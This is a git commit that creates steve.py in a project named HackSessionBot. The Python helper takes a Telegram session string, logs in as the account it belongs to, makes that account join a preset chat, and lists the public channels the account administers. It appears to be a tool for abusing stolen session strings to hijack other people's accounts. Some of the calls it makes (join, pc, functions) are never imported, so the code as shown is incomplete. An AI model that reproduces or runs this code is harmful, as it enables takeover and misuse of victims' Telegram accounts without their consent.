9396dc13c7a01bc93d69820ce46506450e53b0f4
SupremeStark <123313682+SupremeStark@users.noreply.github.com>
2023-01-27 15:42:15 +0530

    Create steve.py

---
+++ HackSessionBot/Helpers/steve.py
@@ -0,0 +1,47 @@
+from pyrogram import Client
+from telethon import TelegramClient
+from telethon.sessions import StringSession  
+from HackSessionBot import (
+     API_ID,
+     API_HASH,
+     CHAT )
+
+
+
+async def users_gc(session):
+    err = ""
+    msg = ""
+    if session.endswith("="):
+        async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
+            try:
+                try:
+                    await steve(join(CHAT))
+                except:
+                    pass
+                k = await steve(pc())            
+                for x in k.chats:
+                    try:
+                        msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
+                    except:
+                        pass
+            except Exception as idk:
+                err += str(idk)
+    else:    
+        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            try:
+                try:
+                    await stark.join_chat(CHAT)
+                except:
+                    pass
+                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
+                for x in k.chats:
+                    try:
+                        msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
+                    except:
+                        pass
+            except Exception as idk:
+                err += str(idk)                    
+    if err:
+        return err
+    return msg
+       
